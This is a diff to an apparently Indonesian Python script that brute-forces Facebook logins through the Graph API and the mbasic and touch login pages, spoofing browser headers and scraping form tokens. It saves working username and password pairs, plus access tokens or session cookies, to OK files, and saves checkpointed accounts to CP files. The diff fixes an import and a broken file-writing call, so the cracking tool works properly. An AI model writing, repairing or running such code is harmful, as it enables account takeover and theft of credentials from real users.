@@ -13,8 +13,9 @@ except ImportError:
 	print("\n ! module bs4 belum terinstall")
 	os.system("pip2 install bs4")
 
-import os, sys, re, time, requests, json, random, bs4, calendar
+import os, sys, re, time, requests, json, random, calendar
 from multiprocessing.pool import ThreadPool
+from bs4 import BeautifulSoup as parser
 from datetime import datetime
 from datetime import date
 
@@ -310,13 +311,13 @@ def bapi(user):
 			if "session_key" in send.text and "EAAA" in send.text:
 				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 				ok.append("%s|%s"%(uid, pw))
-				open("OK/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
+				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
 				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
+				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 
@@ -349,7 +350,7 @@ def mbasic(user):
 			ses = requests.Session()
 			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
-			b = bs4.BeautifulSoup(p,"html.parser")
+			b = parser(p,"html.parser")
 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 			for i in b("input"):
 				try:
@@ -362,13 +363,13 @@ def mbasic(user):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
-				open("OK/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
+				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
 				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
+				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 
@@ -401,7 +402,7 @@ def mobile(user):
 			ses = requests.Session()
 			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
-			b = bs4.BeautifulSoup(p,"html.parser")
+			b = parser(p,"html.parser")
 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 			for i in b("input"):
 				try:
@@ -414,13 +415,13 @@ def mobile(user):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
-				open("OK/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
+				open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
 				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
+				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 
@@ -454,7 +455,7 @@ def manual():
 				ses = requests.Session()
 				ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 				p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
-				b = bs4.BeautifulSoup(p,"html.parser")
+				b = parser(p,"html.parser")
 				bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 				for i in b("input"):
 					try:
@@ -467,13 +468,13 @@ def manual():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 					ok.append("%s|%s"%(uid, pw))
-					open("OK/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
+					open("OK/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
 					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
-					open("CP/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
+					open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
 
